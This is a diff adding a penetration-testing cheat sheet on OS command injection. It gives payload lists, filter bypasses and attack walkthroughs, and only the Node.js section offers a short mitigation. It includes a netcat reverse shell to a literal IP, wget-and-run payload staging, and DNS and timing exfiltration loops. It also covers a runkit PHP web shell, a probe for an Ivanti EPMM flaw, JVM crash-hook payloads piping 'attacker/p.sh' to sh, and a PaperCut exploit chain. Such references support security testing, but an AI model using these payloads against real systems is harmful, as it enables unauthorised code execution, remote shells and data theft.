@@ -1,0 +1,290 @@
+# Command Injection
+
+{{#include ../banners/hacktricks-training.md}}
+
+## What Is Command Injection?
+
+A **command injection** permits the execution of arbitrary operating system commands by an attacker on the server hosting an application. As a result, the application and all its data can be fully compromised. The execution of these commands typically allows the attacker to gain unauthorized access or control over the application's environment and underlying system.<sup>[[2]](#references)</sup>
+
+### Context
+
+Depending on **where your input is being injected** you may need to **terminate the quoted context** (using `"` or `'`) before the commands.<sup>[[1]](#references)</sup>
+
+## Command Injection/Execution
+
+```bash
+#Both Unix and Windows supported
+ls||id; ls ||id; ls|| id; ls || id # Execute both
+ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
+ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
+ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
+ls %0A id # %0A Execute both (RECOMMENDED)
+ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)
+
+#Only unix supported
+`ls` # ``
+$(ls) # $()
+ls; id # ; Chain commands
+ls${LS_COLORS:10:1}${IFS}id # Might be useful
+
+#Not executed but may be interesting
+> /var/www/html/out.txt #Try to redirect the output to a file
+< /etc/passwd #Try to send some input to the command
+```
+
+### PHP rule engines with `runkit` enabled
+
+Some applications implement admin-only “rule engines” by **executing attacker-supplied PHP**. If the environment enables the `runkit` extension, an attacker can redefine or inject functions at runtime and escalate a logic-only rule editor into **full PHP RCE**.
+
+Indicators:
+
+- Admin UI accepts PHP-like “rules” that are evaluated.
+- `runkit` / `runkit7` is loaded (`phpinfo()` or `extension_loaded('runkit')`).
+
+Abuse example (redefine a function used by the rules to execute a command):
+
+```php
+<?php
+runkit_function_redefine('checkBid', '$bid', 'system($_GET["cmd"]); return true;');
+```
+
+If the rule content is stored and evaluated later, it becomes a persistent RCE primitive within the web context.<sup>[[7]](#references)</sup>
+
+### **Restriction Bypasses**
+
+If you are trying to execute **arbitrary commands inside a linux machine** you will be interested to read about this **Bypasses:**
+
+
+{{#ref}}
+../linux-hardening/linux-basics/bypass-linux-restrictions/
+{{#endref}}
+
+### **Examples**
+
+```
+vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
+vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
+vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
+```
+
+### Bash arithmetic evaluation in RewriteMap/CGI-style scripts
+
+RewriteMap helpers written in **bash** sometimes push query params into globals and later compare them in **arithmetic contexts** (`[[ $a -gt $b ]]`, `$((...))`, `let`). Arithmetic expansion re-tokenizes the content, so attacker-controlled variable names or array references are expanded twice and can execute.<sup>[[9]](#references)</sup>
+
+**Pattern seen in Ivanti EPMM RewriteMap helpers:**
+
+1. Params map to globals (`st` → `gStartTime`, `h` → `theValue`).
+2. Later check:
+   ```bash
+   if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]]; then
+       ...
+   fi
+   ```
+3. Send `st=theValue` so `gStartTime` points to the string `theValue`.
+4. Send `h=gPath['sleep 5']` so `theValue` contains an array index; during the arithmetic check it runs `sleep 5` (swap for a real payload).
+
+Probe (~5s delay then 404 if vulnerable):
+
+```bash
+curl -k "https://TARGET/mifs/c/appstore/fob/ANY?st=theValue&h=gPath['sleep 5']"
+```
+
+Notes:
+
+- Look for the same helper under other prefixes (e.g., `/mifs/c/aftstore/fob/`).
+- Arithmetic contexts treat unknown tokens as variable/array identifiers, so this bypasses simple metacharacter filters.
+
+### Parameters
+
+Here are the top 25 parameters that could be vulnerable to code injection and similar RCE vulnerabilities (from [link](https://twitter.com/trbughunters/status/1283133356922884096)):<sup>[[10]](#references)</sup>
+
+```
+?cmd={payload}
+?exec={payload}
+?command={payload}
+?execute{payload}
+?ping={payload}
+?query={payload}
+?jump={payload}
+?code={payload}
+?reg={payload}
+?do={payload}
+?func={payload}
+?arg={payload}
+?option={payload}
+?load={payload}
+?process={payload}
+?step={payload}
+?read={payload}
+?function={payload}
+?req={payload}
+?feature={payload}
+?exe={payload}
+?module={payload}
+?payload={payload}
+?run={payload}
+?print={payload}
+```
+
+### Time based data exfiltration
+
+Extracting data: char by char
+
+```
+swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
+real    0m5.007s
+user    0m0.000s
+sys 0m0.000s
+
+swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
+real    0m0.002s
+user    0m0.000s
+sys 0m0.000s
+```
+
+### DNS based data exfiltration
+
+Based on the tool from `https://github.com/HoLyVieR/dnsbin` also hosted at dnsbin.zhack.ca
+
+```
+1. Go to http://dnsbin.zhack.ca/
+2. Execute a simple 'ls'
+for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
+```
+
+```
+$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
+```
+
+Online tools to check for DNS based data exfiltration:
+
+- dnsbin.zhack.ca
+- pingb.in
+
+### Filtering bypass
+
+#### Windows
+
+```
+powershell C:**2\n??e*d.*? # notepad
+@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
+```
+
+#### Linux
+
+See the dedicated [Linux restriction-bypass guide](../linux-hardening/linux-basics/bypass-linux-restrictions/) for shell, character, and command-construction techniques.
+
+### Node.js `child_process.exec` vs `execFile`
+
+When auditing JavaScript/TypeScript back-ends you will often encounter the Node.js `child_process` API.
+
+```javascript
+// Vulnerable: user-controlled variables interpolated inside a template string
+const { exec } = require('child_process');
+exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
+  /* … */
+});
+```
+
+`exec()` spawns a **shell** (`/bin/sh -c`), so characters with special meaning to that shell (backticks, `;`, `&&`, `|`, `$()`, and others) can cause **command injection** when untrusted input is concatenated into the command string. PHP's `proc_open()` presents the same risk when passed a shell command string instead of a safely separated argument array.<sup>[[11]](#references)</sup>
+
+**Mitigation:**  use `execFile()` (or `spawn()` without the `shell` option) and provide **each argument as a separate array element** so no shell is involved:
+
+```javascript
+const { execFile } = require('child_process');
+execFile('/usr/bin/do-something', [
+  '--id_user', id_user,
+  '--payload', JSON.stringify(payload)
+]);
+```
+
+Real-world case: *Synology Photos* ≤ 1.7.0-0794 was exploitable through an unauthenticated WebSocket event that placed attacker controlled data into `id_user` which was later embedded in an `exec()` call, achieving RCE (Pwn2Own Ireland 2024).<sup>[[3]](#references)</sup>
+
+### Argument/Option injection via leading hyphen (argv, no shell metacharacters)
+
+Not all injections require shell metacharacters. If the application passes untrusted strings as arguments to a system utility (even with `execve`/`execFile` and no shell), many programs will still parse any argument that begins with `-` or `--` as an option. This lets an attacker flip modes, change output paths, or trigger dangerous behaviors without ever breaking into a shell.
+
+Typical places where this appears:
+
+- Embedded web UIs/CGI handlers that build commands like `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>`, etc.
+- Centralized CGI routers (e.g., `/cgi-bin/<something>.cgi` with a selector parameter like `topicurl=<handler>`) where multiple handlers reuse the same weak validator.
+- Administrative wrappers such as ISPConfig helpers, where a low-privilege web action may pass filenames or options into privileged utilities.<sup>[[12]](#references)</sup>
+
+What to try:
+
+- Provide values that start with `-`/`--` to be consumed as flags by the downstream tool.
+- Abuse flags that change behavior or write files, for example:
+  - `ping`: `-f`/`-c 100000` to stress the device (DoS)
+  - `curl`: `-o /tmp/x` to write arbitrary paths, `-K <url>` to load attacker-controlled config
+  - `tcpdump`: `-G 1 -W 1 -z /path/script.sh` to achieve post-rotate execution in unsafe wrappers
+- If the program supports `--` end-of-options, try to bypass naive mitigations that prepend `--` in the wrong place.<sup>[[4]](#references)</sup>
+
+Generic PoC shapes against centralized CGI dispatchers:
+
+```
+POST /cgi-bin/cstecgi.cgi HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+# Flip options in a downstream tool via argv injection
+topicurl=<handler>&param=-n
+
+# Unauthenticated RCE when a handler concatenates into a shell
+topicurl=setEasyMeshAgentCfg&agentName=;id;
+```
+
+### JVM diagnostic callbacks for guaranteed exec
+
+Any primitive that lets you **inject JVM command-line arguments** (`_JAVA_OPTIONS`, launcher config files, `AdditionalJavaArguments` fields in desktop agents, etc.) can be turned into a reliable RCE without touching application bytecode:
+
+1. **Force a deterministic crash** by shrinking metaspace or heap: `-XX:MaxMetaspaceSize=16m` (or a tiny `-Xmx`). This guarantees an `OutOfMemoryError` even during early bootstrap.
+2. **Attach an error hook**: `-XX:OnOutOfMemoryError="<cmd>"` or `-XX:OnError="<cmd>"` executes an arbitrary OS command whenever the JVM aborts.
+3. Optionally add `-XX:+CrashOnOutOfMemoryError` to avoid recovery attempts and keep the payload one-shot.
+
+Example payloads:
+
+```
+-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand <blob>"
+-XX:MaxMetaspaceSize=12m -XX:OnOutOfMemoryError="/bin/sh -c 'curl -fsS https://attacker/p.sh | sh'"
+```
+
+Because these diagnostics are parsed by the JVM itself, no shell metacharacters are required and the command runs with the same integrity level as the launcher. Desktop IPC bugs that forward user-supplied JVM flags (see [Localhost WebSocket abuse](websocket-attacks.md#localhost-websocket-abuse--browser-port-discovery)) therefore translate directly into OS command execution.<sup>[[5]](#references)</sup>
+
+## PaperCut NG/MF SetupCompleted auth bypass -> print scripting RCE
+
+- Vulnerable NG/MF builds (e.g., 22.0.5 Build 63914) expose `/app?service=page/SetupCompleted`; browsing there and clicking **Login** returns a valid `JSESSIONID` without credentials (authentication bypass in the setup flow).
+- In **Options → Config Editor**, set `print-and-device.script.enabled=Y` and `print.script.sandboxed=N` to turn on printer scripting and disable the sandbox.
+- In the printer **Scripting** tab, enable the script and keep `printJobHook` defined to avoid validation errors, but place the payload **outside** the function so it executes immediately when you click **Apply** (no print job needed):
+
+```js
+function printJobHook(inputs, actions) {}
+cmd = ["bash","-c","curl http://attacker/hit"];
+java.lang.Runtime.getRuntime().exec(cmd);
+```
+
+- Swap the callback for a reverse shell; if the UI/PoC cannot handle pipes/redirects, stage a payload with one command and exec it with a second request.<sup>[[6]](#references)</sup>
+- Horizon3's [CVE-2023-27350.py](https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py) automates the auth bypass, config flips, command execution, and rollback—run it through an upstream proxy (e.g., `proxychains` → Squid) when the service is only reachable internally.<sup>[[8]](#references)</sup>
+
+## Brute-Force Detection List
+
+
+{{#ref}}
+https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
+{{#endref}}
+
+
+## References
+
+- [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
+- [2] [OS command injection | Web Security Academy](https://portswigger.net/web-security/os-command-injection)
+- [3] [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
+- [4] [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)
+- [5] [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)
+- [6] [PaperCut NG/MF SetupCompleted auth bypass → print scripting RCE](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
+- [7] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
+- [8] [CVE-2023-27350.py (auth bypass + print scripting automation)](https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py)
+- [9] [Unit 42 – Bash arithmetic expansion RCE in Ivanti RewriteMap scripts](https://unit42.paloaltonetworks.com/ivanti-cve-2026-1281-cve-2026-1340/)
+- [10] [Top 25 parameters that might be vulnerable to RCE (@trbughunters)](https://twitter.com/trbughunters/status/1283133356922884096)
+- [11] [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
+- [12] [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
+
+{{#include ../banners/hacktricks-training.md}}
